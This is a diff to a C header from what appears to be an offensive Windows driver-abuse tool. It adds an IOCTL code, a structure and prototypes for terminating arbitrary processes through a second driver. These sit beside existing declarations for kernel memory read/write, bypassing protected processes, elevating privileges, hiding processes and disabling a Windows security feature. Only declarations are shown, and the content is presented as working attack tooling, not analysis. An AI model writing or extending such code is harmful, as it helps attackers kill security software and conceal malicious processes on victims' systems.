@@ -11,6 +11,8 @@
 #define IOCTL_WRITE		0x8000204C
 #define IOCTL_READ		0x80002048
 
+#define IOCTL_TERM      0x22201C
+
 
 #ifndef STATUS_INFO_LENGTH_MISMATCH
 #define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
@@ -23,6 +25,10 @@
 
 
 
+struct TfmonSysTermStruct {
+    BYTE pad1[4];
+    HANDLE pid;
+};
 
 struct RtcoreRWStruct {
 	BYTE	pad1[8]; // 0 --> 8
@@ -58,6 +64,9 @@ void Write32(HANDLE, DWORD64, DWORD);
 void Write64(HANDLE hDevice, DWORD64 Address, DWORD64 Value);
 
 void WriteN(HANDLE hDevice, DWORD64 Address, BYTE* Value);
+
+
+BOOL terminatePrimitive(HANDLE hDevice, DWORD pid);
 
 
 struct ModulesData {
@@ -151,4 +160,7 @@ VOID BypassPpl(HANDLE hDevice, DWORD64 pid);
 VOID elevateProc(HANDLE hDevice, DWORD64 pid);
 VOID hideProc(HANDLE hDevice, DWORD64 pid);
 VOID disableWTI(HANDLE hDevice);
+VOID terminateProcess(HANDLE hDevice, DWORD pid);
+
+
 #endif // !UTILS_H
